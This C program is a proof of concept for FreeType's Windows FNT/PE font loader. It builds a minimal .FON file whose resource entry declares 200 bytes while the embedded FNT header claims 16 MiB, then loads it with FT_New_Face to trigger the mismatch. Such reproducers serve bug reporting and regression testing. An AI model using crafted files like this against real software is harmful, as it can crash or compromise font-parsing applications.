/*
 * PoC for the winfnt PE resource loader.
 *
 * The program writes a minimal PE FON file whose RT_FONT resource entry
 * declares a 200-byte resource, while the FNT header inside the resource
 * claims a file size of 16 MiB.  The file is then opened with FT_New_Face.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <freetype/freetype.h>


#define FONT_RVA     0x1100   /* RVA of the font data (= VA + 0x100)     */
#define FONT_SIZE    200      /* size declared by the resource entry     */
#define HEADER_SIZE  0x1000000 /* size declared by the FNT header itself */


static void
put_le16( unsigned char* p, unsigned short v )
{
  p[0] = (unsigned char)( v        & 0xFF );
  p[1] = (unsigned char)( ( v >> 8 ) & 0xFF );
}


static void
put_le32( unsigned char* p, unsigned long v )
{
  p[0] = (unsigned char)( v         & 0xFF );
  p[1] = (unsigned char)( ( v >> 8 )  & 0xFF );
  p[2] = (unsigned char)( ( v >> 16 ) & 0xFF );
  p[3] = (unsigned char)( ( v >> 24 ) & 0xFF );
}


static void
put_rsrc_dir( unsigned char* p )
{
  memset( p, 0, 16 );
  put_le16( p + 12, 0 );             /* NumberOfNamedEntries */
  put_le16( p + 14, 1 );             /* NumberOfIdEntries    */
}


static void
put_rsrc_entry( unsigned char* p, unsigned long name, unsigned long offset )
{
  put_le32( p, name );
  put_le32( p + 4, offset );
}


static void
put_fnt_header( unsigned char* p )
{
  memset( p, 0, 148 );

  put_le16( p + 0, 0x0300 );         /* version                   */
  put_le32( p + 2, HEADER_SIZE );    /* file size                 */
  memcpy( p + 6, "Resource", 8 );    /* copyright                 */
  put_le16( p + 66, 0 );             /* file type (raster)        */
  put_le16( p + 68, 12 );            /* nominal point size        */
  put_le16( p + 70, 72 );            /* vertical resolution       */
  put_le16( p + 72, 72 );            /* horizontal resolution     */
  put_le16( p + 74, 12 );            /* ascent                    */
  put_le16( p + 86, 8 );             /* pixel width               */
  put_le16( p + 88, 16 );            /* pixel height              */
  put_le16( p + 91, 8 );             /* average width             */
  put_le16( p + 93, 8 );             /* maximum width             */
  p[95] = 0x20;                      /* first character           */
  p[96] = 0x7E;                      /* last character            */
  p[97] = 0x20;                      /* default character         */
  p[98] = 0x20;                      /* break character           */
  put_le32( p + 105, 0 );            /* face name offset          */
}


static int
write_fon( const char*  path )
{
  unsigned char  buf[0x300 + FONT_SIZE];
  FILE*          f;
  size_t         n;


  memset( buf, 0, sizeof ( buf ) );

  /* MZ header */
  buf[0] = 'M';
  buf[1] = 'Z';
  put_le32( buf + 0x3C, 0x40 );      /* e_lfanew                  */

  /* PE signature, COFF and optional header */
  memcpy( buf + 0x40, "PE\0\0", 4 );
  put_le16( buf + 0x44, 0x014C );    /* machine (i386)            */
  put_le16( buf + 0x46, 1 );         /* number of sections        */
  put_le16( buf + 0x54, 0xE0 );      /* size of optional header   */
  put_le16( buf + 0x58, 0x10B );     /* PE32 magic                */
  put_le32( buf + 0xC8, 0x1000 );    /* resource table RVA        */
  put_le32( buf + 0xCC, 0x1100 );    /* resource table size       */

  /* section table */
  memcpy( buf + 0x138, ".rsrc", 5 );
  put_le32( buf + 0x144, 0x1000 );   /* virtual address           */
  put_le32( buf + 0x148, 0x1100 );   /* size of raw data          */
  put_le32( buf + 0x14C, 0x200 );    /* pointer to raw data       */

  /* resource tree: RT_FONT -> font -> language -> data entry */
  put_rsrc_dir( buf + 0x200 );
  put_rsrc_entry( buf + 0x210, 8, 0x80000000UL | 0x18 );
  put_rsrc_dir( buf + 0x218 );
  put_rsrc_entry( buf + 0x228, 1, 0x80000000UL | 0x30 );
  put_rsrc_dir( buf + 0x230 );
  put_rsrc_entry( buf + 0x240, 0x409, 0x48 );
  put_le32( buf + 0x248, FONT_RVA ); /* offset to data            */
  put_le32( buf + 0x24C, FONT_SIZE ); /* size                      */

  /* the FNT resource itself */
  put_fnt_header( buf + 0x300 );

  f = fopen( path, "wb" );
  if ( !f )
    return 1;

  n = fwrite( buf, 1, sizeof ( buf ), f );
  fclose( f );

  return n != sizeof ( buf );
}


int
main( int argc, char** argv )
{
  const char*  path = argc > 1 ? argv[1] : "newbug.fon";
  FT_Library   library;
  FT_Face      face = NULL;
  FT_Error     error;


  if ( write_fon( path ) )
  {
    fprintf( stderr, "could not write %s\n", path );
    return 2;
  }

  if ( FT_Init_FreeType( &library ) )
    return 2;

  error = FT_New_Face( library, path, 0, &face );
  printf( "FT_New_Face -> %d\n", (int)error );

  if ( !error )
  {
    printf( "family: %s\n", face->family_name );
    FT_Done_Face( face );
  }

  FT_Done_FreeType( library );

  remove( path );

  return error ? 1 : 0;
}


/* EOF */
